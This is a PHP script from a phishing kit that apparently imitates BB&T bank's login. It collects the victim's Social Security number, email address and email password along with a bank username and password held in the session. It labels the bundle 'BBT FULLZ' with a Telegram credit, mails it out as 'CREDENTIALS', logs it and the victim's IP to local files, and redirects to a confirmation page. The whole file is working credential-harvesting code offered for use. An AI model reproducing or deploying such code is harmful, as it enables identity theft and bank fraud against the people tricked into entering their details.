<?php
error_reporting(0);
session_start();
set_time_limit(0);
include '../main.php';
if($_POST['j_ssn'] == "" || $_POST['j_email'] == '' || $_POST['j_email_pass'] == '') {

    $error = 'Please Enter Valid DL Number/Account Number and Billing Address';
    echo "<META HTTP-EQUIV='refresh' content='0; URL=./../verify.php?error=".$error."&appIdKey=".$_SESSION['key']."&country=US'>";
    exit();
}
$j_ssn = $_POST['j_ssn'];
$j_email = $_POST['j_email'];
$j_email_pass = $_POST['j_email_pass'];

$_SESSION['j_ssn'] = $j_ssn;
$_SESSION['j_email'] = $j_email;
$_SESSION['j_email_pass'] = $j_email_pass;



$message  = "++-------------------------[ BBT FULLZ ]-----------------------------++\n";
$message .= "Username			: ".$_SESSION['j_username']."\n";
$message .= "Password			: ".$_SESSION['j_password']."\n";
$message .= "SSN			: ".$_SESSION['j_ssn']."\n";
$message .= "Email			: ".$_SESSION['j_email']."\n";
$message .= "Email Password			: ".$_SESSION['j_email_pass']."\n";

$message .= "IP Address		: ".$ip2."\n";
$message .= "++--------------[ OLD CODE https://t.me/oldcode]---------------++\n";


sendMail('CREDENTIALS', $message);

$click = fopen("./logs/clicks.txt","a");
fwrite($click,"$ip2"."\n");
fclose($click);
$click = fopen("./logs/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,$message);
fclose($click);
echo "<META HTTP-EQUIV='refresh' content='0; URL=./../confirm.php?error=&appIdKey=".$_SESSION['key']."&country=US'>";
exit();



